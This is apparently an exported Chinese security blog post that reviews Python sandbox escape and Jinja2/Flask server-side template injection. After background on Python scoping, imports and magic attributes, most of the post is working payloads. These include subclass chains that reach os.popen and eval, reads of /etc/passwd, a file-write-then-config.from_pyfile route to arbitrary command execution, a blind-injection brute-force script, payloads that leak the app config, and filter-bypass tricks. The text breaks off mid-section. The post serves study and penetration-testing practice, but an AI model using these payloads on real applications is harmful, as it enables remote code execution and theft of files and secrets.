<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[知识点回顾之Pyhon模版注入]]></title>
    <url>%2F2020%2F11%2F14%2F1%2F</url>
    <content type="text"><![CDATA[如有天樱花正开，期望可跟你示爱。 0x01 背景知识最近复习一下ssti的知识，发现之前了解地好浅，只会用，真是个弟弟，借此机会，深入了解了一下并且记录，这里仅仅总结，助于以后的查阅。 Python 变量作用域首先是Python 变量作用域，Python是静态作用域，也就是说在Python中，变量的作用域源于它在代码中的位置；在不同的位置，可能有不同的命名空间。命名空间是变量作用域的体现形式，规则是 LEGB，各自代表的含义L-Local函数内的命名空间。作用范围：当前整个函数体范围。E-Enclosing function locals外部嵌套函数的命名空间。作用范围：闭包函数。G-Global全局命名空间。作用范围：当前模块(文件)。B-Builtin内建模块命名空间。作用范围：所有模块(文件)然后再看一下import导入机制：当 import 一个模块时首先会在 sys.modules 这个字典中查找是否已经加载了此模块，如果加载了则只是将模块的名字加入到正在调用 import 的模块的 Local 命名空间中。如果没有加载则从 sys.path 目录中按照模块名称查找模块文件，模块可以是 py、pyc、pyd，找到后将模块载入内存，并加到 sys.modules 中，并将名称导入到当前的 Local 命名空间。通过 from a import b 导入，a 会被添加到 sys.modules 字典中，b 会被导入到当前的 Local 命名空间。通过 import a as b 导入，a 会被添加到 sys.modules 字典中，b 会被导入到当前的 Local 命名空间。对于嵌套导入的，比如 a.py 中存在一个 import b，那么 import a 时，a 和 b 模块都会被添加到 sys.modules 字典中，a 会被导入到当前的 Local 命名空间中，虽然模块 b 已经加载到内存了，如果访问还要再明确的在本模块中 import b。导入模块时会执行该模块。所以说如果某一个模块导入了os模块，我们就可以利用该模块的 dict 进而使用os模块另外python中万物皆对象，python中类都有一个祖先object类，可以通过class.bases查一下，当然在python2中string有点特殊，多了一个basestring，再查看一下base类才是object。接下来就是了解一下魔术函数和一些其他的函数 object类python的object类中集成了很多的基础函数，我们想要调用的时候也是需要用object去操作的，主要是通过mro和bases两种方式来创建object的方法如下：1234&gt;&gt;&gt; ().__class__.__mro__(&lt;type &apos;tuple&apos;&gt;, &lt;type &apos;object&apos;&gt;)&gt;&gt;&gt; ().__class__.__bases__(&lt;type &apos;object&apos;&gt;,) __builtins__builtins即是引用，Python程序一旦启动，它就会在程序员所写的代码运行之前就已经被加载到内存中了，而对于builtins却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块可以通过dir()函数来查看该模块内包含的函数，同时也可以通过dict属性调用这些函数。12345678910111213141516171819202122232425&gt;&gt;&gt; __builtins__.__dict__[&apos;__import__&apos;]&lt;built-in function __import__&gt;&gt;&gt;&gt; __builtins__.__import__&lt;built-in function __import__&gt;&gt;&gt;&gt; for i in enumerate(__builtins__.__dict__):... print(i)... (0, &apos;__name__&apos;)(1, &apos;__doc__&apos;)(2, &apos;__package__&apos;)...&gt;&gt;&gt; for i in enumerate(dir(__builtins__)):... print(i)... (0, &apos;__name__&apos;)(1, &apos;__doc__&apos;)...&gt;&gt;&gt; __builtins__.__import__(&apos;os&apos;).system(&apos;ls&apos;)__pycache__ ssti test2.py test3.py test4.py0&gt;&gt;&gt; __builtins__.__dict__[&apos;__import__&apos;](&apos;os&apos;).system(&apos;ls&apos;)__pycache__ ssti test2.py test3.py test4.py0 __class__返回调用的类型 __mro__mro用于展示类的继承关系，查看类继承的所有父类，直到object，类似于bases，这是python的多继承，可以与java做类比12345678910111213141516171819202122232425#python2.7&apos;&apos;.__class__.__mro__[2]&#123;&#125;.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0]request.__class__.__mro__[1]#python3.7&apos;&apos;.__class__.__mro__[1]&#123;&#125;.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0]需要注意的是：针对jinjia2/flask：&#123;&#123;request.__class__.__mro__&#125;&#125;(&lt;class &apos;flask.wrappers.Request&apos;&gt;, &lt;class &apos;werkzeug.wrappers.request.Request&apos;&gt;, &lt;class &apos;werkzeug.wrappers.base_request.BaseRequest&apos;&gt;, &lt;class &apos;werkzeug.wrappers.accept.AcceptMixin&apos;&gt;, &lt;class &apos;werkzeug.wrappers.etag.ETagRequestMixin&apos;&gt;, &lt;class &apos;werkzeug.wrappers.user_agent.UserAgentMixin&apos;&gt;, &lt;class &apos;werkzeug.wrappers.auth.AuthorizationMixin&apos;&gt;, &lt;class &apos;werkzeug.wrappers.cors.CORSRequestMixin&apos;&gt;, &lt;class &apos;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&apos;&gt;, &lt;class &apos;flask.wrappers.JSONMixin&apos;&gt;, &lt;class &apos;werkzeug.wrappers.json.JSONMixin&apos;&gt;, &lt;class &apos;object&apos;&gt;) __bases__返回所有直接父类组成的元组1234567891011121314python2下，可以发现&quot;&quot;的base类是&lt;type &apos;basestring&apos;&gt;&gt;&gt;&gt; &quot;&quot;.__class__.__bases__(&lt;type &apos;basestring&apos;&gt;,)&gt;&gt;&gt; &quot;&quot;.__class__.__base__&lt;type &apos;basestring&apos;&gt;&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__bases__(&lt;type &apos;object&apos;&gt;,)&gt;&gt;&gt; &#123;&#125;.__class__.__bases__(&lt;type &apos;object&apos;&gt;,)&gt;&gt;&gt; [].__class__.__bases__(&lt;type &apos;object&apos;&gt;,)&gt;&gt;&gt; ().__class__.__bases__(&lt;type &apos;object&apos;&gt;,)python3的base都是&lt;type &apos;object&apos;&gt; __init__类实例创建之后调用, 对当前对象的实例的一些初始化123456&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[30].__init__&lt;slot wrapper &apos;__init__&apos; of &apos;object&apos; objects&gt;&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[59].__init__&lt;unbound method catch_warnings.__init__&gt;wrapper是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性，后面会用到 __globals__能够返回函数所在模块命名空间的所有变量此文件下的所有 不只是这个类的另外func_globals也是的，这里需要简单了解一下python的运行机制 __getattribute__当类被调用的时候，无条件进入此函数。 __getattr__对象中不存在的属性时调用 __getitem__()list、tuple have getitem()，在后面的bypass可以使用的到。1234&gt;&gt;&gt; dir(().__class__.__bases__.__getitem__(0))[&apos;__class__&apos;, &apos;__delattr__&apos;, &apos;__doc__&apos;, &apos;__format__&apos;, &apos;__getattribute__&apos;, &apos;__hash__&apos;, &apos;__init__&apos;, &apos;__new__&apos;, &apos;__reduce__&apos;, &apos;__reduce_ex__&apos;, &apos;__repr__&apos;, &apos;__setattr__&apos;, &apos;__sizeof__&apos;, &apos;__str__&apos;, &apos;__subclasshook__&apos;]&gt;&gt;&gt; dir(().__class__.__bases__[0])[&apos;__class__&apos;, &apos;__delattr__&apos;, &apos;__doc__&apos;, &apos;__format__&apos;, &apos;__getattribute__&apos;, &apos;__hash__&apos;, &apos;__init__&apos;, &apos;__new__&apos;, &apos;__reduce__&apos;, &apos;__reduce_ex__&apos;, &apos;__repr__&apos;, &apos;__setattr__&apos;, &apos;__sizeof__&apos;, &apos;__str__&apos;, &apos;__subclasshook__&apos;] __subclasses__获取类的所有子类，这是一个list。123456789101112131415161718In [6]: ().__class__.__bases__[0].__subclasses__()Out[6]: [type, weakref, weakcallableproxy, weakproxy,...In [72]: for i in enumerate(&quot;&quot;.__class__.__bases__[0].__subclasses__()): ...: print(i) ...: (0, &lt;class &apos;type&apos;&gt;)(1, &lt;class &apos;weakref&apos;&gt;)(2, &lt;class &apos;weakcallableproxy&apos;&gt;)(3, &lt;class &apos;weakproxy&apos;&gt;)(4, &lt;class &apos;int&apos;&gt;)(5, &lt;class &apos;bytearray&apos;&gt;).... __import__import接收字符串作为参数，导入该字符串名称的模块。如import sys相当于import(‘sys’)，另外由于参数是字符串的形式，当然这样也是可以的import(‘o’+’s’)。列出常规的3种导入方式：1234&gt;&gt;&gt; import flask&gt;&gt;&gt; from flask import Flask&gt;&gt;&gt; __import__(&apos;flask&apos;)&lt;module &apos;flask&apos; from &apos;/usr/local/lib/python3.7/site-packages/flask/__init__.py&apos;&gt; 另外继续看接下来看一下Python import 的步骤python 所有加载的模块信息都存放在 sys.modules 结构中，当 import 一个模块时，会按如下步骤来进行如果是 import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A如果是 from A import B，先为 A 创建 module 对象，再解析A，从中寻找B并填充到 A 的 dict 中12345678910111213141516&gt;&gt;&gt; sys.modules[&apos;os&apos;]=None&gt;&gt;&gt; import osTraceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;ImportError: No module named os&gt;&gt;&gt; __import__(&apos;os&apos;)Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;ImportError: No module named os&gt;&gt;&gt; import importlib&gt;&gt;&gt; importlib.import_module(&apos;os&apos;)Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt; File &quot;importlib/__init__.py&quot;, line 37, in import_module __import__(name)ImportError: No module named os 可以发现，将os从sys.modules中删掉之后,就不能再引入了，不过了解了机制，如下这样做就可以了。123&gt;&gt;&gt; import sys&gt;&gt;&gt; sys.modules[&apos;os&apos;]=&apos;/usr/lib/python2.7/os.py&apos;&gt;&gt;&gt; import os 添加module的过程中,是需要用到sys模块的 ,如果我们把sys,os,reload全部干掉,那就无论如何也再无法引入了。这个时候，我们知道,引入模块的过程,其实总体来说就是把对应模块的代码执行一遍的过程，禁止了引入,我们还是可以执行的,我们知道了对应的路径,我们就可以执行相应的代码，前提是知道对应的路径。12&gt;&gt;&gt; execfile(&apos;/usr/lib/python2.7/os.py&apos;)&gt;&gt;&gt; system(&apos;cat /etc/passwd&apos;) linecache（行-缓存 ）这里需要了解linecache模块，它允许它获取Python资源文件的任一行。当系统试图进行内部优化时，就会使用一个高速缓存。为什么要了解它呢？我们看一下这个linecache模块能给我带来什么惊喜。(tips: globals、func_globals are dict)1234567891011121314&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__bases__[0].__subclasses__()[59]&lt;class &apos;warnings.WarningMessage&apos;&gt;&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[59]&lt;class &apos;warnings.catch_warnings&apos;&gt;&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;]&lt;module &apos;linecache&apos; from &apos;/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/linecache.pyc&apos;&gt;&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].os.system(&apos;whoami&apos;)xxhx0&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__.keys()[&apos;updatecache&apos;, &apos;clearcache&apos;, &apos;__all__&apos;, &apos;__builtins__&apos;, &apos;__file__&apos;, &apos;cache&apos;, &apos;checkcache&apos;, &apos;getline&apos;, &apos;__package__&apos;, &apos;sys&apos;, &apos;getlines&apos;, &apos;__name__&apos;, &apos;os&apos;, &apos;__doc__&apos;]&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.keys()[&apos;updatecache&apos;, &apos;clearcache&apos;, &apos;__all__&apos;, &apos;__builtins__&apos;, &apos;__file__&apos;, &apos;cache&apos;, &apos;checkcache&apos;, &apos;getline&apos;, &apos;__package__&apos;, &apos;sys&apos;, &apos;getlines&apos;, &apos;__name__&apos;, &apos;os&apos;, &apos;__doc__&apos;] 可以发现我们可以通过linecache模块获得os、sys等模块。 os模块123456In [143]: os.system(&apos;whoami&apos;)xxhxOut[143]: 0In [144]: os.popen(&quot;whoami&quot;).read() ...: Out[144]: &apos;xxhx\n commands模块commands模块会返回命令的输出和执行的状态位，仅限Linux环境（直接引入大佬的文章内容，不再开linux环境测试了）1234import commandscommands.getstatusoutput(&quot;ls&quot;)commands.getoutput(&quot;ls&quot;)commands.getstatus(&quot;ls&quot;) subprocess模块123import subprocesssubprocess.call(command, shell=True)subprocess.Popen(command, shell=True) pty模块仅限Linux环境12import ptypty.spawn(&quot;ls&quot;) timeit模块123In [146]: import timeitIn [147]: timeit.timeit(&quot;__import__(&apos;os&apos;).system(&apos;dir&apos;)&quot;,number=1)In [148]: timeit.timeit(&quot;__import__(&apos;os&apos;).system(&apos;ls&apos;)&quot;,number=1) platform模块12In [158]: import platformIn [159]: platform.os.system(&apos;ls&apos;) importlib模块可以使用import_module和import。1234567891011In [161]: import importlib ...: importlib.import_module(&apos;os&apos;).system(&apos;ls&apos;)1.png README.md app.py requirements.txtDockerfile __pycache__ docker-compose.ymlOut[161]: 0In [162]: importlib.__import__(&apos;os&apos;).system(&apos;ls&apos;) ...: 1.png README.md app.py requirements.txtDockerfile __pycache__ docker-compose.ymlOut[162]: 0 sys模块该模块通过modules()函数引入命令执行模块来实现：1234567891011121314151617181920In [164]: import sys ...: sys.versionOut[164]: &apos;3.8.2 (default, Mar 11 2020, 00:29:50) \n[Clang 11.0.0 (clang-1100.0.33.17)]&apos;In [165]:sys.modules[&apos;os&apos;].system(&apos;ls&apos;)1.png README.md app.py requirements.txtDockerfile __pycache__ docker-compose.ymlOut[165]: 0In [167]: import sys ...: sys.pathOut[167]: [&apos;/usr/local/bin&apos;, &apos;/usr/local/Cellar/python@3.8/3.8.2/Frameworks/Python.framework/Versions/3.8/lib/python38.zip&apos;,...In [168]: import sys ...: sys.modules codecs模块123import codecscodecs.open(&apos;/etc/passwd&apos;).read()codecs.open(&apos;test.txt&apos;, &apos;w&apos;).write(&apos;xxx&apos;) dir()函数dir()都可以看到 此对象可以调用的方法,dir() 函数不带参数时，返回当前范围内的变量、方法和定义的类型列表；带参数时，返回参数的属性、方法列表。如果参数包含方法dir()，该方法将被调用。如果参数不包含dir()，该方法将最大限度地收集参数信息。1234567891011121314In [29]: dir(())Out[29]: [&apos;__add__&apos;, &apos;__class__&apos;, &apos;__contains__&apos;, &apos;__delattr__&apos;,...In [30]: dir(&apos;&apos;)Out[30]: [&apos;__add__&apos;, &apos;__class__&apos;, &apos;__contains__&apos;,... exec()/eval()/execfile()/compile()函数这几个函数都能执行参数的Python代码。1compile(&apos;a = 1 + 2&apos;, &apos;&lt;string&gt;&apos;, &apos;exec&apos;) 注意：execfile()只存在于Python2，Python3没有该函数。 file()函数该函数只存在于Python212file(&apos;/etc/passwd&apos;).read()file(&apos;test.txt&apos;,&apos;w&apos;).write(&apos;xxx&apos;) open()函数12open(&apos;/etc/passwd&apos;).read()open(&apos;test.txt&apos;,&apos;a&apos;).write(&apos;xxx&apos;) reload()函数我们可以通过reload()函数重新加载,reload()方法123&gt;&gt;&gt; reload(__builtins__)&gt;&gt;&gt; import os&gt;&gt;&gt; dir(os) 这里说一下bypass用的情况，后面就不列举了。某些情况下，通过del将一些模块的某些方法给删除掉了，但是我们可以通过reload()函数重新加载该模块，从而可以调用删除掉的可利用的方法：1234567891011&gt;&gt;&gt; __builtins__.__dict__[&apos;eval&apos;]&lt;built-in function eval&gt;&gt;&gt;&gt; del __builtins__.__dict__[&apos;eval&apos;]&gt;&gt;&gt; __builtins__.__dict__[&apos;eval&apos;]Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;KeyError: &apos;eval&apos;&gt;&gt;&gt; reload(__builtins__)&lt;module &apos;__builtin__&apos; (built-in)&gt;&gt;&gt;&gt; __builtins__.__dict__[&apos;eval&apos;]&lt;built-in function eval&gt; 在Python3中，reload()被转移到imp模块以及importlib模块中。Python3.4之前在imp中，Python3.4之后imp模块逐步被废弃，reload()移至importlib模块中，需要from imp import reload。 URLopener()函数1234567&gt;&gt;&gt; from urllib import request&gt;&gt;&gt; request.URLopener&lt;class &apos;urllib.request.URLopener&apos;&gt;&gt;&gt;&gt; dir(request.URLopener())[&apos;_URLopener__tempfiles&apos;, &apos;_URLopener__unlink&apos;, &apos;__class__&apos;, &apos;__del__&apos;, &apos;__delattr__&apos;, &apos;__dict__&apos;, &apos;__dir__&apos;, &apos;__doc__&apos;, &apos;__eq__&apos;, &apos;__format__&apos;, &apos;__ge__&apos;, &apos;__getattribute__&apos;, &apos;__gt__&apos;, &apos;__hash__&apos;, &apos;__init__&apos;, &apos;__init_subclass__&apos;, &apos;__le__&apos;, &apos;__lt__&apos;, &apos;__module__&apos;, &apos;__ne__&apos;, &apos;__new__&apos;, &apos;__reduce__&apos;, &apos;__reduce_ex__&apos;, &apos;__repr__&apos;, &apos;__setattr__&apos;, &apos;__sizeof__&apos;, &apos;__str__&apos;, &apos;__subclasshook__&apos;, &apos;__weakref__&apos;, &apos;_https_connection&apos;, &apos;_open_generic_http&apos;, &apos;addheader&apos;, &apos;addheaders&apos;, &apos;cert_file&apos;, &apos;cleanup&apos;, &apos;close&apos;, &apos;ftpcache&apos;, &apos;http_error&apos;, &apos;http_error_default&apos;, &apos;key_file&apos;, &apos;open&apos;, &apos;open_data&apos;, &apos;open_file&apos;, &apos;open_ftp&apos;, &apos;open_http&apos;, &apos;open_https&apos;, &apos;open_local_file&apos;, &apos;open_unknown&apos;, &apos;open_unknown_proxy&apos;, &apos;proxies&apos;, &apos;retrieve&apos;, &apos;tempcache&apos;, &apos;version&apos;]&gt;&gt;&gt; request.URLopener().open_file(&apos;/etc/passwd&apos;).read()b&apos;##\n# User Database\n# \n# Note that this file is consulted directly only when the system is running\n# in single-user mode. &lt;class ‘_frozen_importlib.BuiltinImporter’>这个是内建包import工具，通过传入内建模块的字符串，我们可以将核心模块引入123456789&gt;&gt;&gt; globals()[&apos;__loader__&apos;]().load_module(&apos;io&apos;)&lt;module &apos;io&apos; (built-in)&gt;&gt;&gt;&gt; globals()[&apos;__loader__&apos;]().load_module(&apos;sys&apos;)&lt;module &apos;sys&apos; (built-in)&gt;&gt;&gt;&gt; globals()[&apos;__loader__&apos;]().load_module(&apos;os&apos;)&gt;&gt;&gt; globals()[&apos;__loader__&apos;]().load_module(&apos;os&apos;).system(&apos;ls&apos;)Applications 0x02 沙箱逃逸和SSTIPython沙箱Python沙箱即以一定的方法模拟Python终端，实现用户对Python的使用。那么Python沙箱逃逸就是攻击者通过某种绕过的方式，从模拟的沙箱环境中逃逸出来，从而实现执行系统命令等攻击操作。 SSTIWeb应用程序经常使用模板系统（例如Twig和FreeMarker）将动态内容嵌入到网页和电子邮件中。当用户输入以不安全的方式嵌入模板时，将发生模板注入。此漏洞通常是由于开发人员有意让用户提交或编辑模板而引起的-一些模板引擎为此目的提供了一种安全模式。它远非特定于市场营销应用程序-支持高级用户提供的标记的任何功能可能都很容易受到攻击，包括Wiki页面，评论，甚至评论。当简单地将用户输入直接连接到模板中时，模板注入也会偶然发生。只要当使用模版语言的时候才会发现模版注入漏洞，当然伴随的xss。其实xss的存在可以作为模版注入的探针。但是模版语言的语法和HTML的语言不冲突，所以测试的时候往往发现了xss就默认了，完美错过了模版注入。这里针对python，比php的smarty、java的FreeMarker。Flask是一个使用Python编写的轻量级Web应用框架。其 WSGI 工具箱采用Werkzeug，模板引擎则使用Jinja2。Jinja2是Flask作者开发的一个模板系统，起初是仿django模板的一个模板引擎，为Flask提供模板支持，由于其灵活，快速和安全等优点被广泛使用。在Jinja2中，存在三种语句：123控制结构 &#123;% %&#125;变量取值 &#123;&#123; &#125;&#125;注释 &#123;# #&#125; 以及两个渲染模版函数。12render_template_string()render_template() 值得一提的是，字符串格式化，就是render_template_string()使用时候，这个函数作用和前面的类似，顾名思义，区别在于只是第一个参数并非是文件名而是字符串。也就是说，我们不需要再在templates目录中新建HTML文件了，而是可以直接将HTML代码写到一个字符串中，然后使用该函数渲染该字符串中的HTML代码到页面即可。漏洞点酒存在与字符串格式化的时候，作为模板的字符串参数中的传入参数是通过%s的形式获取而非变量取值语句的形式获取，从而导致攻击者通过构造恶意的模板语句来注入到模板中、模板解析执行了模板语句从而实现SSTI攻击。1234@app.route(&apos;/&apos;,methods = [&apos;GET&apos;,&apos;POST&apos;])def hello_ssti(): template = &apos;&apos;&apos;&lt;h2&gt;Hello %s!&lt;/h2&gt;&apos;&apos;&apos; % request.args.get(&apos;name&apos;)return render_template_string(template, person=person) 当get传入的name参数是Jinja2模版语言的时候，ssti就出现了。 0x03 常规操作获得基类123456789101112#python2.7&apos;&apos;.__class__.__mro__[2]&#123;&#125;.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0]request.__class__.__mro__[1]#python3.7&apos;&apos;.__class__.__mro__[1]&#123;&#125;.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0]request.__class__.__mro__[1] 文件操作123456789101112# python 2.7找到file类[].__class__.__bases__[0].__subclasses__()[40]读文件[].__class__.__bases__[0].__subclasses__()[40](&apos;/etc/passwd&apos;).read()写文件[].__class__.__bases__[0].__subclasses__()[40](&apos;/tmp&apos;).write(&apos;test&apos;)# python3.7&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].open(&apos;filename&apos;, &apos;r&apos;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;windows下的os命令&quot;&quot;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&apos;popen&apos;](&apos;dir&apos;).read() 命令执行12345678910111213141516171819202122232425262728293031323334353637383940414243# python2.7os执行[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;]下有os类，可以直接执行命令：&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12]&lt;module &apos;os&apos; from &apos;/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/os.pyc&apos;&gt;&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].system(&apos;ls&apos;)Applications PowerUp.ps1[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].os.popen(&apos;id&apos;).read()print(().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].__dict__[&apos;sy&apos;+&apos;stem&apos;](&apos;ls&apos;))重新载入__builtins__：实例化了数据print(().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__[&apos;__import__&apos;](&quot;os&quot;).system(&quot;ls&quot;))&lt;class &apos;warnings.catch_warnings&apos;&gt;类很特殊，在内部定义了_module=sys.modules[&apos;warnings&apos;](&apos;_warnings&apos;, &lt;module &apos;_warnings&apos; (built-in)&gt;)然后warnings模块包含有__builtins__eval,impoer等全局函数[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&quot;__import__(&apos;os&apos;).popen(&apos;id&apos;).read()&quot;)[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;].os.popen(&apos;id&apos;).read()print(().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).system(&quot;ls&quot;)&apos;))#python3.7&#123;% for c in [].__class__.__base__.__subclasses__() %&#125; &#123;% if c.__name__==&apos;catch_warnings&apos; %&#125; &#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].eval(&quot;__import__(&apos;os&apos;).popen(&apos;id&apos;).read()&quot;) &#125;&#125; &#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &apos;catch_warnings&apos; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &apos;eval&apos; in b.keys() %&#125; &#123;&#123; b[&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&apos;) &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 也可以利用from_pyfile加载对象到Flask配置环境，这种利用方式算是一种简单的漏洞组合拳。先利用文件写入漏洞写一个Python文件：1234向SSTI漏洞注入&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/owned.cfg&apos;, &apos;w&apos;).write(&apos;from subprocess import check_output\n\nRUNCMD = check_output\n&apos;) &#125;&#125;&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40]&lt;type &apos;file&apos;&gt; 然后使用config.from_pyfile将该Python文件加载到config变量中：1?name=&#123;&#123; config.from_pyfile(&apos;/tmp/owned.cfg&apos;) &#125;&#125; 访问全局变量config查看是否加载成功：12&#123;&#123;config&#125;&#125;可以发现返回的有这个参数RUNCMD：..... 加载成功后，就可以通过以下形式执行任意命令了：12name=&#123;&#123;config[&apos;RUNCMD&apos;](&apos;whoami&apos;)&#125;&#125;&#123;&#123; config[&apos;RUNCMD&apos;](&apos;/usr/bin/id&apos;,shell=True) &#125;&#125; 盲注如果不能执行命令就用盲注的方式爆出来，脚本如下12345678910111213141516171819202122&#123;% if &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/test&apos;).read()[0:1]==&apos;p&apos; %&#125;~p0~&#123;% endif %&#125;# -*- coding: utf-8 -*-import requestsurl = &apos;http://127.0.0.1:8080/&apos;def check(payload): postdata = &#123; &apos;exploit&apos;:payload &#125; r = requests.post(url, data=postdata).content return &apos;~p0~&apos; in rpassword = &apos;&apos;s = r&apos;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$\&apos;()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~\&apos;&quot;_%&apos;for i in xrange(0,100): for c in s: payload = &apos;&#123;% if &quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&quot;/tmp/test&quot;).read()[&apos;+str(i)+&apos;:&apos;+str(i+1)+&apos;] == &quot;&apos;+c+&apos;&quot; %&#125;~p0~&#123;% endif %&#125;&apos; if check(payload): password += c break print password 间接引用在不断的dir过程中，发现closure 这个object保存了参数，可以引用原生的import1print __import__.__getattribute__(&apos;__clo&apos;+&apos;sure__&apos;)[0].cell_contents(&apos;o&apos;+&apos;s&apos;).__getattribute__(&apos;sy&apos;+&apos;stem&apos;)(&apos;l&apos;+&apos;s home&apos;) sys.modules间接调用前面两个模块12?name=&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;sys&apos;).modules[&apos;os&apos;].popen(&apos;whoami&apos;).read()&#125;&#125;?name=&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;sys&apos;).modules[&apos;platform&apos;].popen(&apos;whoami&apos;).read()&#125;&#125; 获取配置信息：123?name=&#123;&#123;config&#125;&#125;?name=&#123;&#123;url_for.__globals__[&apos;current_app&apos;].config&#125;&#125;?name=&#123;&#123;get_flashed_messages.__globals__[&apos;current_app&apos;].config&#125;&#125; 0x04沙箱逃逸技巧关键字过滤/字符拼接/字符翻转如果没用过滤引号,使用反转,或者各种拼接绕过1234567891011&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;]&#123;&apos;bytearray&apos;: &lt;type &apos;bytearray&apos;&gt;, &apos;IndexError&apos;: &lt;type &apos;exceptions.IndexError&apos;&gt;, &apos;all&apos;: &lt;built-in function all&gt;...&gt;&gt;&gt; &apos;__snitliub__&apos;[::-1]&apos;__builtins__&apos;&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__snitliub__&apos;[::-1]]&#123;&apos;bytearray&apos;: &lt;type &apos;bytearray&apos;&gt;, &apos;IndexError&apos;: &lt;type &apos;exceptions.IndexError&apos;&gt;, &apos;all&apos;: &lt;built-in function all&gt;...&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__buil&apos;+&apos;__snit&apos;[::-1]]&#123;&apos;bytearray&apos;: &lt;type &apos;bytearray&apos;&gt;, &apos;IndexError&apos;: &lt;type &apos;exceptions.IndexError&apos;&gt;, &apos;all&apos;: &lt;built-in function all&gt;... 过滤了引号使用chr函数12&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;chr&apos;] %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125; 使用request对象,利用将需要的变量放在请求中,然后通过[],或者通过attr,getattribute获得1234567891011121314?vul = ().__class__.__bases__.__getitem__(0).__subclasses__()[58].__init__.__globals__[request.args.a] [request.args.b]&amp;a=chr&amp;b=__builtins__&gt;&gt;&gt; ().__class__.__bases__.__getitem__(0).__subclasses__()[58].__init__.__globals__[&apos;__builtins__&apos;][&apos;chr&apos;] &lt;built-in function chr&gt;当然也可以利用request.values（formdata）、request.cookies（cookies）、request.headres （headers）、request.获取各种路径等去构造&gt;&gt;&gt; ().__class__.__bases__.__getitem__(0).__subclasses__()[40]&lt;type &apos;file&apos;&gt;&gt;&gt;&gt; 